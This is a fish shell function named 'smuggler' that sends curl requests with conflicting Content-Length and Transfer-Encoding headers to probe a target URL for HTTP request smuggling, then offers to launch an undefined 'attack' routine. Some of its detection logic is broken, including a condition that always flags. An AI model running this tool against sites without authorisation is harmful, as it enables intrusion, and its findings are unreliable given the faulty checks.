function smuggler
    argparse -n smuggler 'm/method=' 'auto' 'attack' 'h/help' -- $argv
    or return

    if set -q _flag_help
        echo "Usage: smuggler <target> [options]"
        echo "  -m <method>   HTTP method (default: POST)"
        echo "  --auto        Non-interactive output"
        echo "  --attack      Attack target on find"
        echo "Tests for HTTP request smuggling (CL.TE, TE.CL)."
        return
    end

    if test (count $argv) -lt 1
        echo "Error: target URL required"
        return 1
    end

    set target $argv[1]
    if not string match -qr '^https?://' "$target"
        set target "https://$target"
    end

    set method "POST"
    if set -q _flag_method; set method $_flag_method; end

    echo (set_color cyan)"==> SMUGGLER: $target"(set_color normal)
    echo (set_color brblack)"    Testing CL.TE, TE.CL, TE.TE techniques..."(set_color normal)

    set findings

    # CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding
    set req_cl_te "$method $target HTTP/1.1\r\nHost: "(echo "$target" | sed -E 's#^https?://##; s#/.*##')"\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    # TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length
    set req_te_cl "$method $target HTTP/1.1\r\nHost: "(echo "$target" | sed -E 's#^https?://##; s#/.*##')"\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n"
    # TE.TE: Obfuscated Transfer-Encoding
    set req_te_te "$method $target HTTP/1.1\r\nHost: "(echo "$target" | sed -E 's#^https?://##; s#/.*##')"\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"

    function __test_smuggle -a label req
        set resp (curl -sS --max-time 10 -X "$method" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --data-binary (echo -e "$req" | head -c 200) \
            "$target" 2>/dev/null | wc -c | string trim)
        echo "  $label -> response size: $resp"
        if test "$resp" -lt 50 -o "$resp" -gt 0
            echo (set_color yellow)"  [!] Possible $label smuggle (unusual response size)"(set_color normal)
            set -a findings "$label"
        end
    end

    # Simpler test: send chunked POST and compare response
    echo ""
    echo (set_color brblack)"  Test 1: Normal request (baseline)"(set_color normal)
    set normal (curl -sS -o /dev/null -w "%{http_code}|%{size_download}" --max-time 10 "$target" 2>/dev/null)
    echo "  Normal: $normal"

    echo ""
    echo (set_color brblack)"  Test 2: CL.TE - Content-Length + Transfer-Encoding: chunked"(set_color normal)
    # Send with both headers — if vulnerable, frontend uses CL, backend uses TE
    set resp1 (curl -sS --max-time 10 -X "$method" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 1" \
        --data-raw "0" \
        -w "%{http_code}|%{size_download}" \
        "$target" 2>/dev/null)
    echo "  CL.TE: $resp1"

    echo ""
    echo (set_color brblack)"  Test 3: TE.CL - Transfer-Encoding: chunked wins"(set_color normal)
    set resp2 (curl -sS --max-time 10 -X "$method" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 100" \
        --data-raw "0\r\n\r\n" \
        -w "%{http_code}|%{size_download}" \
        "$target" 2>/dev/null)
    echo "  TE.CL: $resp2"

    echo ""
    echo (set_color brblack)"  Test 4: TE.TE - Obfuscated TE header"(set_color normal)
    set resp3 (curl -sS --max-time 10 -X "$method" \
        -H "Transfer-Encoding: chunked" \
        -H "Transfer-encoding: x" \
        --data-raw "0\r\n\r\n" \
        -w "%{http_code}|%{size_download}" \
        "$target" 2>/dev/null)
    echo "  TE.TE: $resp3"

    # Compare responses for differences
    set normal_code (string split '|' -- $normal)[1]
    set normal_size (string split '|' -- $normal)[2]
    set te_code (string split '|' -- $resp1)[1]
    set te_size (string split '|' -- $resp1)[2]

    echo ""
    if test "$te_code" != "$normal_code" -o "$te_size" != "$normal_size"
        echo (set_color red)"  [VULN] Smuggling detected (response differs from baseline)"(set_color normal)
        set -a findings "SMUGGLING_DETECTED"
    else
        echo (set_color green)"  No obvious smuggling detected"(set_color normal)
    end

    if not set -q _flag_auto -a (count $findings) -gt 0
        echo ""
        echo -n "Launch attack? [y/N] "
        read -l ans
        if test "$ans" = "y" -o "$ans" = "Y"
            attack "$target"
        end
    end

    if set -q _flag_attack
        attack "$target"
    end
end
